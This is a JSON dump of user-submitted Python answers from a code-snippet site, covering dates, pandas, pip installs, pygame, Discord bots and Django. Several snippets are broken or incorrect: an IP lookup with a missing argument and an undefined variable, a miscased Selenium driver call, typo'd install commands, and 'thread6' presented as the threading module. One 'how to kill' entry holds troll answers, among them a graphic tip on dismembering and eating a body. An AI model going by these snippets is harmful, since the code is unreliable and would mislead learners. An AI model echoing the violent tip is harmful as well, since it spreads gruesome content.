    "title": " how to get the current date in flask python",
    "description": "from datetime import date //today is an object so you can get the day, month and year by //treating it as an object. eg: today.day, today.month, today.year today = date.today() print(\"Today's date:\", today)\n",
    "reg_date": "2021-10-12T11:30:23.000Z"
  },
  {
    "id": 1640,
    "keyword": null,
    "link": null,
    "title": " how to get the ip address of laptop with python",
    "description": "#firstly import socket import socket #it is important to get host name get it host_name = socket.gethostname() ip_adress = socket.gethostbyname() print(\"Ip address of\",hostbyname,\"is\",ip_adress\n",
    "reg_date": "2021-10-12T11:30:23.000Z"
  },
  {
    "id": 1641,
    "keyword": null,
    "link": null,
    "title": " how to get the live website html in python",
    "description": "import requests html_code = requests.get('url')\n",
    "reg_date": "2021-10-12T11:30:23.000Z"
  },
  {
    "id": 1642,
    "keyword": null,
    "link": null,
    "title": " how to get the location of the cursor screen in python",
    "description": "import mouse  print(mouse.get_position())\n",
    "reg_date": "2021-10-12T11:30:23.000Z"
  },
  {
    "id": 1643,
    "keyword": null,
    "link": null,
    "title": " how to get the mouse input in pygame",
    "description": "if event.type == pygame.MOUSEBUTTONDOWN:     print(event.button)      #------------------------# 1 - left click 2 - middle click 3 - right click 4 - scroll up 5 - scroll down #------------------------#\n__code-examples__python__how_to_get_the_mouse_input_in_pygame__?\nif event.type == pygame.MOUSEBUTTONDOWN:     print(event.button)      #------------------------# 1 - left click 2 - middle click 3 - right click 4 - scroll up 5 - scroll down #------------------------#\n",
    "reg_date": "2021-10-12T11:30:24.000Z"
  },
  {
    "id": 1644,
    "keyword": null,
    "link": null,
    "title": " how to get the name of a class in python",
    "description": "class test:   @property   def cls_name(self):     return self.__class__.__name__      @property   def cls_name_2(self):     return type(self).__name__      @classmethod  \tdef cls_name_3(cls): \t\treturn cls.__name__        ins = test()  print(ins.cls_name) print(ins.cls_name_2) print(ins.cls_name_3())\nclass SillyClassName:     @classmethod  \tdef my_name(cls_): \t\treturn cls_.__name__   def class_name(self):   \t# self.__class__ gets the current class     # .__name__ gets the name \treturn self.__class__.__name__  SillyClassName.my_name() # prints SillyClassName  inst = SillyClassName() inst.class_name() # prints SillyClassName\n",
    "reg_date": "2021-10-12T11:30:24.000Z"
  },
  {
    "id": 1645,
    "keyword": null,
    "link": null,
    "title": " how to get the size of an object in python",
    "description": "import sys object = set()  print(sys.getsizeof(object)) ##### will get 216 possibly based on version 3.9 ###  ###  use different objects like list(), dict(), str(), int(), float(), etc..### ### for getting to know size of each objects and use the most appropriate ### ## particularly set and dict will seem to not change in size even after ## ## adding lots of values but they are just so huge, only use them to store ## ## large values ## \n",
    "reg_date": "2021-10-12T11:30:24.000Z"
  },
  {
    "id": 1646,
    "keyword": null,
    "link": null,
    "title": " how to get the url of the current page in selenium python",
    "description": "print(driver.current_url)\ndriver.current_url\nprint(browser.current_url)\n",
    "reg_date": "2021-10-12T11:30:24.000Z"
  },
  {
    "id": 1647,
    "keyword": null,
    "link": null,
    "title": " how to get the user ip in djagno",
    "description": "def get_client_ip(request):     x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')     if x_forwarded_for:         ip = x_forwarded_for.split(',')[0]     else:         ip = request.META.get('REMOTE_ADDR')     return ip\n",
    "reg_date": "2021-10-12T11:30:24.000Z"
  },
  {
    "id": 1648,
    "keyword": null,
    "link": null,
    "title": " how to get total number of rows in listbox tkinter",
    "description": "listbox.size()\n",
    "reg_date": "2021-10-12T11:30:24.000Z"
  },
  {
    "id": 1649,
    "keyword": null,
    "link": null,
    "title": " how to get unix timestamp in python",
    "description": "import time time.time() #returns the unix timestamp\nfrom datetime import datetime  timestamp = 1545730073 dt_object = datetime.fromtimestamp(timestamp)  print(\"dt_object =\", dt_object) print(\"type(dt_object) =\", type(dt_object)) \n",
    "reg_date": "2021-10-12T11:30:24.000Z"
  },
  {
    "id": 1650,
    "keyword": null,
    "link": null,
    "title": " how to get user inout in python",
    "description": "#just get input test = input()  #add a custom message test = input(\"Please enter your information: \")  #turning what is inputed into a differnt type of data test = int(input(\"Please enter your information: \"))\n",
    "reg_date": "2021-10-12T11:30:24.000Z"
  },
  {
    "id": 1651,
    "keyword": null,
    "link": null,
    "title": " how to get user location in python",
    "description": "import geocoder\t\t# pip install geocoder g = geocoder.ip('me') print(g.latlng)\n",
    "reg_date": "2021-10-12T11:30:24.000Z"
  },
  {
    "id": 1652,
    "keyword": null,
    "link": null,
    "title": " how to get what type of file in python",
    "description": "import os  # unpacking the tuple file_name, file_extension = os.path.splitext(\"/Users/pankaj/abc.txt\")  print(file_name) #returns abc print(file_extension) #returns .txt \n",
    "reg_date": "2021-10-12T11:30:24.000Z"
  },
  {
    "id": 1653,
    "keyword": null,
    "link": null,
    "title": " how to get words from a string in python",
    "description": "sentence = \"How are you feeling today\" sentence = sentence.split() # this returns list of words # output = [\"How\", \"are\", \"you\", \"feeling\", \"today\"]\n",
    "reg_date": "2021-10-12T11:30:25.000Z"
  },
  {
    "id": 1654,
    "keyword": null,
    "link": null,
    "title": " how to give autocomplete in python",
    "description": "import readline readline.parse_and_bind(\"tab: complete\")  def complete(text,state):     volcab = ['dog','cat','rabbit','bird','slug','snail']     results = [x for x in volcab if x.startswith(text)] + [None]     return results[state]  readline.set_completer(complete)  line = input('prompt> ')\n",
    "reg_date": "2021-10-12T11:30:25.000Z"
  },
  {
    "id": 1655,
    "keyword": null,
    "link": null,
    "title": " how to give multiple option to the user and ask the same question again and again until the user tells one of the options",
    "description": "while True:     data = input(\"Please enter a loud message (must be all caps): \")     if not data.isupper():         print(\"Sorry, your response was not loud enough.\")         continue     else:         #we're happy with the value given.         #we're ready to exit the loop.         break  while True:     data = input(\"Pick an answer from A to D:\")     if data.lower() not in ('a', 'b', 'c', 'd'):         print(\"Not an appropriate choice.\")     else:         break \n",
    "reg_date": "2021-10-12T11:30:25.000Z"
  },
  {
    "id": 1656,
    "keyword": null,
    "link": null,
    "title": " how to identify GPU with pytorch script",
    "description": "In [1]: import torch  In [2]: torch.cuda.current_device() Out[2]: 0  In [3]: torch.cuda.device(0) Out[3]: <torch.cuda.device at 0x7efce0b03be0>  In [4]: torch.cuda.device_count() Out[4]: 1  In [5]: torch.cuda.get_device_name(0) Out[5]: 'GeForce GTX 950M'  In [6]: torch.cuda.is_available() Out[6]: True \n",
    "reg_date": "2021-10-12T11:30:25.000Z"
  },
  {
    "id": 1657,
    "keyword": null,
    "link": null,
    "title": " how to img in opencv",
    "description": "import cv2 img = cv2.imread('/path_to_image/opencv-logo.png') cv2.imshow('image',img) cv2.waitKey(0) cv2.destroyAllWindows()  # to use it in a loop k = cv2.waitKey(0) if k == 27:         # wait for ESC key to exit     cv2.destroyAllWindows() elif k == ord('s'): # wait for 's' key to save and exit     cv2.imwrite('messigray.png',img)     cv2.destroyAllWindows() \nimport cv2 #Best Usage path = r'image location' img = cv2.imread(path) #if you use resizde img resized_img = cv2.resize(img, (640, 680)) #example 640, 680 cv2.imshow('resized_img', resized_img) cv2.imshow('img', img) cv2.waitKey(0) cv2.destroyAllWindows()    \n",
    "reg_date": "2021-10-12T11:30:25.000Z"
  },
  {
    "id": 1658,
    "keyword": null,
    "link": null,
    "title": " how to import PyMem python",
    "description": "go to terminal and write :   pip install pymem\n",
    "reg_date": "2021-10-12T11:30:25.000Z"
  },
  {
    "id": 1659,
    "keyword": null,
    "link": null,
    "title": " how to import csv in pandas",
    "description": "import pandas as pd  df = pd.read_csv (r'Path where the CSV file is stored\\File name.csv') print (df)\n",
    "reg_date": "2021-10-12T11:30:25.000Z"
  },
  {
    "id": 1660,
    "keyword": null,
    "link": null,
    "title": " how to import data from csv to jupyter notebook",
    "description": "pd.read_csv('file_name',encoding = \"utf-8\") \n",
    "reg_date": "2021-10-12T11:30:25.000Z"
  },
  {
    "id": 1661,
    "keyword": null,
    "link": null,
    "title": " how to import file from a different location python",
    "description": "import sys sys.path.append('temp/temp/temp/temp/temp')\nimport temp\n",
    "reg_date": "2021-10-12T11:30:25.000Z"
  },
  {
    "id": 1662,
    "keyword": null,
    "link": null,
    "title": " how to increase the figure size in matplotlib",
    "description": "plt.figure(figsize=(20,10))\n    plt.figure(figsize=(20,8))\nimport matplotlib.pyplot as plt  plt.figure(figsize=(14,7))  plt.bar(x,y)   # if you have plotted you graph directly using dataframe like this &darr; data.plot(kind='bar')  # then use this plt.rcParams[\"figure.figsize\"] = (14,7)  \nplt.figure(figsize=(14,7))\nfrom matplotlib.pyplot import figure figure(num=None, figsize=(8, 6), dpi=80, facecolor='w', edgecolor='k')\nimport matplotlib.pyplot as plt df.plot(figsize=(12,15))\n",
    "reg_date": "2021-10-12T11:30:26.000Z"
  },
  {
    "id": 1663,
    "keyword": null,
    "link": null,
    "title": " how to input multiple integers in python",
    "description": "x,y=map(int,input().split())#you can change the int to specify or intialize any other data structures print(x) print(y)\n",
    "reg_date": "2021-10-12T11:30:26.000Z"
  },
  {
    "id": 1664,
    "keyword": null,
    "link": null,
    "title": " how to insert a variable into a string without breaking up the string in python",
    "description": "name = \"Dan\" age = 21 #you need to have that \"f\" before the string name_and_age = f\"My name is {name}, and I am {age} years old.\" print(name_and_age)\n",
    "reg_date": "2021-10-12T11:30:26.000Z"
  },
  {
    "id": 1665,
    "keyword": null,
    "link": null,
    "title": " how to install dask in python",
    "description": "pip install \"dask[complete]\"\n",
    "reg_date": "2021-10-12T11:30:26.000Z"
  },
  {
    "id": 1666,
    "keyword": null,
    "link": null,
    "title": " how to install django in virtual environment in ubuntu",
    "description": "pip install django \ndjango-admin --version \npython3.8 -m venv my_env \npython manage.py migrate \ndjango-admin startproject myDjangoProject . \n",
    "reg_date": "2021-10-12T11:30:26.000Z"
  },
  {
    "id": 1667,
    "keyword": null,
    "link": null,
    "title": " how to install drivers for selenium python",
    "description": "#in the terminal add the following pip install webdriver-manager  #in the script add the following to the imports from selenium import webdriver from webdriver_manager.chrome import ChromeDriverManager  #then add the following line to create the page web = webdriver.chrome(chromeDriverManager().install())\n",
    "reg_date": "2021-10-12T11:30:26.000Z"
  },
  {
    "id": 1668,
    "keyword": null,
    "link": null,
    "title": " how to install flask",
    "description": "# install flask (basic, if path is not set yet) py -m pip install flask # or set PATH to use pip: setx PATH \"%PATH%;C:\\<path\\to\\python\\directory\\>\\Scripts\" pip install flask # if \"connection error: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed\" [!]: py -m pip install --trusted-host pypi.python.org pip flask # if PermissionError: [WinError 5] Access is denied py -m pip install --user flask # or via creating a virtual environment venv: py -m venv c:\\path\\to\\new\\environment # then execute: c:\\path\\to\\new\\environment\\Scripts\\activate.bat\npip install flask\n$ python -m pip install Django \n#Works on Batchfile, Powershell or Bash  pip install flask\npip install -U Flask \npip install flask Or If The Problem is \"pip\" not Found Use :  py -m pip install flask\n",
    "reg_date": "2021-10-12T11:30:26.000Z"
  },
  {
    "id": 1669,
    "keyword": null,
    "link": null,
    "title": " how to install nltk",
    "description": "conda install -c anaconda nltk\npip install nltk\n# on Window : press [window] + [R] # in the search bar write cmd   pip install --user -U nltk\nimport nltk nltk.download ()\nimport nltk\n",
    "reg_date": "2021-10-12T11:30:26.000Z"
  },
  {
    "id": 1670,
    "keyword": null,
    "link": null,
    "title": " how to install panda3d",
    "description": "pip install panda3d==1.10.9\n",
    "reg_date": "2021-10-12T11:30:26.000Z"
  },
  {
    "id": 1671,
    "keyword": null,
    "link": null,
    "title": " how to install pandas datareader in conda",
    "description": "// To install this package simply visit the command line and run // conda install pandas-datareader // If you don't have Anaconda, you can install it by running  // pip installpandas-datareader \n",
    "reg_date": "2021-10-12T11:30:26.000Z"
  },
  {
    "id": 1672,
    "keyword": null,
    "link": null,
    "title": " how to install pip in anaconda",
    "description": "python -m pip install --upgrade pip\nconda create -n shrink_venv\n",
    "reg_date": "2021-10-12T11:30:27.000Z"
  },
  {
    "id": 1673,
    "keyword": null,
    "link": null,
    "title": " how to install pyaudio",
    "description": "pip install pipwin pipwin install pyaudio \npip install pipwin then pipwin install pyaudio\nsudo apt-get install libasound-dev portaudio19-dev libportaudio2 libportaudiocpp0 pip install pyaudio --user\nFirst you install pyaudio usiing the command pip install ptpiwin and then pip  install pyaudio. \n",
    "reg_date": "2021-10-12T11:30:27.000Z"
  },
  {
    "id": 1674,
    "keyword": null,
    "link": null,
    "title": " how to install pyaudio in python",
    "description": "pip install pipwin then pipwin install pyaudio\nFirst you install pyaudio usiing the command pip install ptpiwin and then pip  install pyaudio. \n",
    "reg_date": "2021-10-12T11:30:27.000Z"
  },
  {
    "id": 1675,
    "keyword": null,
    "link": null,
    "title": " how to install pygame in python",
    "description": "python3 -m pip install pygame <<<(mac)>>> or python -m pip install pygame <<<(windows)>>> or sudo apt install python3-pygame <<<(ubuntu)>>>\n# To install pygame, type 'pip install pygame' in the  # windows powershell or the os terminal  # To create a blank screen as a setup for a game, use: import pygame import sys  pygame.init()  clock = pygame.time.Clock()  FPS = 30 # How many times the screen will update per second  screen_width = 600 # How wide the window will be screen_height = 600 # how high the window will be  screen = pygame.display.set_mode((screen_width, screen_height)) # creates the screen  while True:     clock.tick(FPS) # updates the screen, the amount of times it does so depends on the FPS     for event in pygame.event.get(): # Allows you to add various events         if event.type == pygame.QUIT: # Allows the user to exit using the X button             pygame.quit()             sys.exit()          \n# on your terminal :  pip install pygame   # check if pygame run :  py -m pygame.examples.aliens  # if a window is open -> pygame is correctly installed \npip install pygame\ntry: pip install pygame else: pip3 install pygame else: python -m pip install pygame else: python3 -m pip install pygame else: py -m pip install pygame(this is my method) (this is only for windows)\nimport pygame pygame.init()  win = pygame.display.set_mode((500,500)) pygame.display.set_caption(\"First Game\")  x = 50 y = 50 width = 40 height = 60 vel = 5  run = True  while run:     pygame.time.delay(100) # This will delay the game the given amount of milliseconds. In our casee 0.1 seconds will be the delay      for event in pygame.event.get():  # This will loop through a list of any keyboard or mouse events.         if event.type == pygame.QUIT: # Checks if the red button in the corner of the window is clicked             run = False  # Ends the game loop  pygame.quit()  # If we exit the loop this will execute and close our game     \n",
    "reg_date": "2021-10-12T11:30:27.000Z"
  },
  {
    "id": 1676,
    "keyword": null,
    "link": null,
    "title": " how to install pygame in python 3.8",
    "description": "python3 -m pip install pygame==2.0.0.dev6\npython3 -m pip install pygame==2.0.0.dev10\n",
    "reg_date": "2021-10-12T11:30:27.000Z"
  },
  {
    "id": 1677,
    "keyword": null,
    "link": null,
    "title": " how to install python3 in ubuntu",
    "description": "# first do: sudo apt-get update # after do: sudo apt-get install python3.6 # then it should be installed\nsudo apt-get install python3.7\nsudo apt update sudo apt install software-properties-common sudo add-apt-repository ppa:deadsnakes/ppa sudo apt update sudo apt install python3.8\n",
    "reg_date": "2021-10-12T11:30:27.000Z"
  },
  {
    "id": 1678,
    "keyword": null,
    "link": null,
    "title": " how to install python pip in ubuntu",
    "description": "#First enter the following command to the terminal @pip3 --version # after that @if it doesnt give a result like pip 20.0.2 from /usr/lib/python3/dist-packages/pip (python 3.8) # enter the following commands sudo apt install python3-pip sudo apt install python3-pip3 #Thats all #Ranuga D\npip3 --version\n",
    "reg_date": "2021-10-12T11:30:27.000Z"
  },
  {
    "id": 1679,
    "keyword": null,
    "link": null,
    "title": " how to install spotipy python",
    "description": "pip install spotipy\n",
    "reg_date": "2021-10-12T11:30:27.000Z"
  },
  {
    "id": 1680,
    "keyword": null,
    "link": null,
    "title": " how to install threading module in python",
    "description": "pip3 install thread6\npip install thread6\n",
    "reg_date": "2021-10-12T11:30:27.000Z"
  },
  {
    "id": 1681,
    "keyword": null,
    "link": null,
    "title": " how to install tkinter",
    "description": "sudo apt-get install python3-tk \n# for pip and windows, in cmd, write: pip install tk\npip3 install tk\npip install tk\nno need to install it. It is usually preinstalled by default. Make sure you write tkinter correctly (with capital letter T on versions less than python 3) while importing\npip install tk  #or pip3 install tk python3 -m pip install tk \n",
    "reg_date": "2021-10-12T11:30:27.000Z"
  },
  {
    "id": 1682,
    "keyword": null,
    "link": null,
    "title": " how to install tkinter for python",
    "description": "sudo apt-get install python3-tk \n# for pip and windows, in cmd, write: pip install tk\n",
    "reg_date": "2021-10-12T11:30:28.000Z"
  },
  {
    "id": 1683,
    "keyword": null,
    "link": null,
    "title": " how to iterate through files in a folder python",
    "description": "import os directory = 'the/directory/you/want/to/use'  for filename in os.listdir(directory):     if filename.endswith(\".txt\"):       #do smth       continue     else:     continue\nimport os  for filename in os.listdir(directory):     if filename.endswith(\".asm\") or filename.endswith(\".py\"):           # print(os.path.join(directory, filename))         continue     else:         continue\nimport os  for filename in os.listdir(directory):     if filename.endswith(\".asm\") or filename.endswith(\".py\"):           # print(os.path.join(directory, filename))         continue     else:         continue \n",
    "reg_date": "2021-10-12T11:30:28.000Z"
  },
  {
    "id": 1684,
    "keyword": null,
    "link": null,
    "title": " how to iterate through images in a folder python",
    "description": "import os directory = 'the/directory/you/want/to/use'  for filename in os.listdir(directory):     if filename.endswith(\".txt\"):       #do smth       continue     else:     continue\n",
    "reg_date": "2021-10-12T11:30:28.000Z"
  },
  {
    "id": 1685,
    "keyword": null,
    "link": null,
    "title": " how to iteratively create a grid within a bigger grid in python",
    "description": "def grid_print(area, units):     print_Area = (area * area)     grid_rows = units + (units + 1) + 2     grid_cols = units + 2     if units % 2 == 0:           # If grid entry is even (it will end up making         grid_rows += 1               # the square uneven, so increase number of rows by 1                             # now grid is technically uneven         for i in range(print_Area):            for row in range(grid_rows):     # for each item in number of items(rows)                for col in range(grid_cols): # for each item in number of items(columns)                    if row == 0 or row == int(grid_rows/2) or row == grid_rows -1:    # if item is beginning, middle or end                    # --  Formatting beam structure  -- #                        if col == 0:                        # beginning, print '+' no '\\n'                            print('+', end='')                        elif col == grid_cols -1:                # end, print '+'                        print('+')                        elif int(grid_cols/2) == col:            # middle:                            if grid_rows % 2 == 0:               # if grid is even, pad '+' with ' '                                print(' + ', end='')        # if grid is uneven, no padding                            else:                           # print '+' no '\\n'                                print('+', end='')                        elif col % 2 == 0:                  # if col item is an even number                            print('-', end='')              # print '-' with no '\\n'                        else:                               # else if col item is uneven item num                            print(' ', end='')              # print ' ' no '\\n'                    else:                    # --  Formatting line structure  -- #                        if col == 0:                        # if column is at starting position 0                            print('|', end='')              # print '|' no '\\n'                        elif col == int(grid_cols/2):            # if column is at middle pos                            if units % 2 == 0:               # print '|' no '\\n'                                print(' | ', end='')        # (has padding if grid is even or not)                            else:                                print('|', end='')                        elif col == grid_cols -1:                # if column is at end position of grid                            print(\"|\")                      # print '|'                        else:                            print(' ', end='')              # all other circumstances, print ' ' no '\\n'\n",
    "reg_date": "2021-10-12T11:30:28.000Z"
  },
  {
    "id": 1686,
    "keyword": null,
    "link": null,
    "title": " how to join a string by new line out of a list python",
    "description": "var = '\\n'.join(myList)\n",
    "reg_date": "2021-10-12T11:30:28.000Z"
  },
  {
    "id": 1687,
    "keyword": null,
    "link": null,
    "title": " how to join csv files in python",
    "description": "import os import glob import pandas as pd os.chdir(\"/mydir\")  extension = 'csv' all_filenames = [i for i in glob.glob('*.{}'.format(extension))]  #combine all files in the list combined_csv = pd.concat([pd.read_csv(f) for f in all_filenames ]) #export to csv combined_csv.to_csv( \"combined_csv.csv\", index=False, encoding='utf-8-sig')\n",
    "reg_date": "2021-10-12T11:30:28.000Z"
  },
  {
    "id": 1688,
    "keyword": null,
    "link": null,
    "title": " how to kick and ban members with discord.py",
    "description": "#this was in a cog    # The below code bans player. @commands.command() @commands.has_permissions(ban_members=True)   async def ban(self, ctx, member: discord.Member, *, reason=None):      await member.ban(reason=reason)      await ctx.send(f'User {member} has been kick')  # The below code unbans player. @commands.command() @commands.has_permissions(administrator=True)   async def unban(self, ctx, *, member):      banned_users = await ctx.guild.bans()      member_name, member_discriminator = member.split(\"#\")          for ban_entry in banned_users:             user = ban_entry.user              if (user.name, user.discriminator) == (member_name, member_discriminator):                 await ctx.guild.unban(user)                 await ctx.send(f'Unbanned {user.mention}')                 return  # The below code kicks player @commands.command() @commands.has_permissions(kick_members=True)     async def kick(self, ctx, member: discord.Member, *, reason=None):         await member.kick(reason=reason)         await ctx.send(f'User {member} has been kick')\n@client.command() @commands.has_permissions(kick_members=True) async def kick(ctx, member: discord.Member, *, reason=None):     if reason==None:       reason=\" no reason provided\"     await ctx.guild.kick(member)     await ctx.send(f'User {member.mention} has been kicked for {reason}')\n",
    "reg_date": "2021-10-12T11:30:28.000Z"
  },
  {
    "id": 1689,
    "keyword": null,
    "link": null,
    "title": " how to kill",
    "description": "print(\"Please don't kill people\")\nyu stupid i am FBI\nsudo kill <PID>\nprint(\"GURUTHECODER IS THE ANSWER.\")\nTip - after killing chop the body in little pieces, cook the pieces and feed to a meat eating animal or eat it yourself\n#include <iostream>   int main() {  std::cout << \"cock and balls\";   return 0; }\n",
    "reg_date": "2021-10-12T11:30:28.000Z"
  },
  {
    "id": 1690,
    "keyword": null,
    "link": null,
    "title": " how to kill all python instancess",
    "description": "sudo pkill python  or sudo pkill python3\n",
    "reg_date": "2021-10-12T11:30:28.000Z"
  },
  {
    "id": 1691,
    "keyword": null,
    "link": null,
    "title": " how to kill yourself",
    "description": "if sad is True:     try:         sad = False     except:         try_again()          elif sad is False:     print(\"good!\")  else:     print(\"get help\")\nprint(\"Please don't kill yourself\")\ni got close to doing it... im better now, thankfully\n",
    "reg_date": "2021-10-12T11:30:28.000Z"
  },
  {
    "id": 1692,
    "keyword": null,
    "link": null,
    "title": " how to know connected user in django",
    "description": "#First make sure you have SessionMiddleware and AuthenticationMiddleware middlewares added to your MIDDLEWARE_CLASSES setting.  #The current user is in request object, you can get it by:  def sample_view(request):     current_user = request.user     print current_user.id \n",
    "reg_date": "2021-10-12T11:30:29.000Z"
  },
  {
    "id": 1693,
    "keyword": null,
    "link": null,
    "title": " how to know if a input is a interger in python",
    "description": "whatever = input(\"Pick an integer > \")     try:         whatever_as_an_integer = int(whatever)         print(\"That was an integer.\")      except ValueError:         print(\"That is not an integer.\")\ninp = input('somrthing: ')  if inp.isnumeric():     print('THat was a integer.') else:     print('That was not a integer.')\nwhatever = input(\"Pick an integer > \") try: \twhatever_as_an_integer = int(whatever)    \tprint(\"That was an integer.\")  except ValueError:     print(\"That is not an integer.\")\ndef check_user_input(input):     try:         # Convert it into integer         val = int(input)         print(\"Input is an integer number. Number = \", val)     except ValueError:         try:             # Convert it into float             val = float(input)             print(\"Input is a float  number. Number = \", val)         except ValueError:             print(\"No.. input is not a number. It's a string\")\n",
    "reg_date": "2021-10-12T11:30:29.000Z"
  },
  {
    "id": 1694,
    "keyword": null,
    "link": null,
    "title": " how to label column names and row names in pandas dataframe",
    "description": "# Basic syntax: # Assign column names to a Pandas dataframe: pandas_dataframe.columns = ['list', 'of', 'column', 'names'] # Note, the list of column names must equal the number of columns in the # \tdataframe and order matters  # Rename specific column names of a Pandas dataframe: pandas_dataframe.rename(columns={'column_name_to_change':'new_name'}) # Note, with this approach, you can specify just the names you want to # \tchange and the order doesn't matter  # For rows, use \"index\". E.g.: pandas_dataframe.index = ['list', 'of', 'row', 'names'] pandas_dataframe.rename(index={'row_name_to_change':'new_name'})\nprint(df.rename(columns={'A': 'a', 'C': 'c'})) #         a   B   c # ONE    11  12  13 # TWO    21  22  23 # THREE  31  32  33 \nprint(df.rename(columns={'A': 'a', 'C': 'c'}))\n",
    "reg_date": "2021-10-12T11:30:29.000Z"
  },
  {
    "id": 1695,
    "keyword": null,
    "link": null,
    "title": " how to lag python",
    "description": "Evil! Anyway...  print(9**9) is easily manageable for python. On a faily fast computer, it will  only take a few milliseconds for the output to appear: 387420489. Check it  against a calculator. Not bad. So let's punish our interpreter properly.  print(9**9*9) Nope. Still fast.  print(9**9*99) is still blisteringly fast.   print(9**9*9*9*9*9*9*99**9) ... at which point, you realize that it's too much  of a waste of your time. Python is just TOO fast. Even getting it to count on  and on until it gets to infinity, or until your device puts itself out of use,  probably won't actually LAG it. So let's get Mr Top-of-the-Class to calculate  pi.      from __future__ import division import math from decimal import Decimal as D from decimal import getcontext  getcontext().prec = 400 MAX = 10000 pi = D(0)  for k in range(MAX):     pi += D(math.pow(16, -k)) * (D(4/(8*k+1)) - D(2/(8*k+4)) - D(1/(8*k+5)) - D(1/(8*k+6)))  print('Pi is' , pi)   Wait, it's still not lagging. Typical.  Conclusion: Python IS  incredibally fast and efficient. So really, throwing your computer outside may be the best option.\n",
    "reg_date": "2021-10-12T11:30:29.000Z"
  },
  {
    "id": 1696,
    "keyword": null,
    "link": null,
    "title": " how to launch an application using python",
    "description": "import subprocess  subprocess.Popen(\"C:\\\\Windows\\\\System32\\\\notepad.exe\") #This will launch notepad But you can enter the path of an executable and this will launch it. \nimport os  os.system(\"program_name\") # To open any program by their name recognized by windows  # OR  os.startfile(\"path to application or any file\") # Open any program, text or office document\n",
    "reg_date": "2021-10-12T11:30:29.000Z"
  },
  {
    "id": 1697,
    "keyword": null,
    "link": null,
    "title": " how to leave some parameters in python and let the value be anything",
    "description": "#With Function def player_run():   pass print(player_run()) #with class class User:   pass \n",
    "reg_date": "2021-10-12T11:30:29.000Z"
  },
  {
    "id": 1698,
    "keyword": null,
    "link": null,
    "title": " how to limit a command to a permission in discord.py",
    "description": "# Make sure you don't have a command called \"commands\" @client.command() # As usual @commands.has_permissions(administrator=True) # Making sure the person executing the command has the permissions async def foo(ctx): \tawait ctx.send(\"Hello\")     #ect\nfrom discord import Member from discord.ext.commands import has_permissions, MissingPermissions  @bot.command(name=\"kick\", pass_context=True) @has_permissions(manage_roles=True, ban_members=True) async def _kick(ctx, member: Member):     await bot.kick(member)  @_kick.error async def kick_error(error, ctx):     if isinstance(error, MissingPermissions):         text = \"Sorry {}, you do not have permissions to do that!\".format(ctx.message.author)         await bot.send_message(ctx.message.channel, text) \n",
    "reg_date": "2021-10-12T11:30:29.000Z"
  },
  {
    "id": 1699,
    "keyword": null,
    "link": null,
    "title": " how to list all keywords in python for the used version",
    "description": ">>> help(\"keywords\")  Here is a list of the Python keywords.  Enter any keyword to get more help.  False               class               from                or None                continue            global              pass True                def                 if                  raise and                 del                 import              return as                  elif                in                  try assert              else                is                  while async               except              lambda              with await               finally             nonlocal            yield break               for                 not \n>>> import keyword >>> keyword.kwlist ['False', 'None', 'True', 'and', 'as', 'assert', 'async', ... >>> len(keyword.kwlist) 35 \n",
    "reg_date": "2021-10-12T11:30:29.000Z"
  },
  {
    "id": 1700,
    "keyword": null,
    "link": null,
    "title": " how to list all programs installed on windows using python",
    "description": "import winreg  def foo(hive, flag):     aReg = winreg.ConnectRegistry(None, hive)     aKey = winreg.OpenKey(aReg, r\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\",                           0, winreg.KEY_READ | flag)      count_subkey = winreg.QueryInfoKey(aKey)[0]      software_list = []      for i in range(count_subkey):         software = {}         try:             asubkey_name = winreg.EnumKey(aKey, i)             asubkey = winreg.OpenKey(aKey, asubkey_name)             software['name'] = winreg.QueryValueEx(asubkey, \"DisplayName\")[0]              try:                 software['version'] = winreg.QueryValueEx(asubkey, \"DisplayVersion\")[0]             except EnvironmentError:                 software['version'] = 'undefined'             try:                 software['publisher'] = winreg.QueryValueEx(asubkey, \"Publisher\")[0]             except EnvironmentError:                 software['publisher'] = 'undefined'             software_list.append(software)         except EnvironmentError:             continue      return software_list  software_list = foo(winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_32KEY) + foo(winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_64KEY) + foo(winreg.HKEY_CURRENT_USER, 0)  for software in software_list:     print('Name=%s, Version=%s, Publisher=%s' % (software['name'], software['version'], software['publisher'])) print('Number of installed apps: %s' % len(software_list))\n",
    "reg_date": "2021-10-12T11:30:29.000Z"
  },
  {
    "id": 1701,
    "keyword": null,
    "link": null,
    "title": " how to load ui file in pyqt5",
    "description": "class Ui(QtWidgets.QMainWindow):     def __init__(self):         super(Ui, self).__init__() # Call the inherited classes __init__ method         uic.loadUi('basic.ui', self) # Load the .ui file         self.show() # Show the GUI \n",
    "reg_date": "2021-10-12T11:30:29.000Z"
  },
  {
    "id": 1702,
    "keyword": null,
    "link": null,
    "title": " how to lock writing to a variable thread python",
    "description": "from threading import Lock, Thread lock = Lock() g = 0 lock.acquire() g += 1 lock.release()\n",
    "reg_date": "2021-10-12T11:30:30.000Z"
  },
  {
    "id": 1703,
    "keyword": null,
    "link": null,
    "title": " how to logout in django",
    "description": "from django.contrib.auth import logout  def logout_view(request):     logout(request)     # Redirect to a success page.\nfrom django.contrib.auth import logout  def logout_view(request):     logout(request)     # Redirect to a success page. \n",
    "reg_date": "2021-10-12T11:30:30.000Z"
  },
  {
    "id": 1704,
    "keyword": null,
    "link": null,
    "title": " how to loop the length of an array pytoh",
    "description": "array = range(10) for i in range(len(array)):   print(array[i])\n",
    "reg_date": "2021-10-12T11:30:30.000Z"
  },
  {
    "id": 1705,
    "keyword": null,
    "link": null,
    "title": " how to loop through dates in python",
    "description": "from datetime import timedelta, date  def daterange(start_date, end_date):     for n in range(int ((end_date - start_date).days)):         yield start_date + timedelta(n)  start_date = date(2013, 1, 1) end_date = date(2015, 6, 2) for single_date in daterange(start_date, end_date):     print(single_date.strftime(\"%Y-%m-%d\"))\nimport datetime  # The size of each step in days day_delta = datetime.timedelta(days=1)  start_date = datetime.date.today() end_date = start_date + 7*day_delta  for i in range((end_date - start_date).days):     print(start_date + i*day_delta) \n2016-07-21 2016-07-22 2016-07-23 2016-07-24 2016-07-25 2016-07-26 2016-07-27 \n",
    "reg_date": "2021-10-12T11:30:30.000Z"
  },
  {
    "id": 1706,
    "keyword": null,
    "link": null,
    "title": " how to loop through files in a directory python",
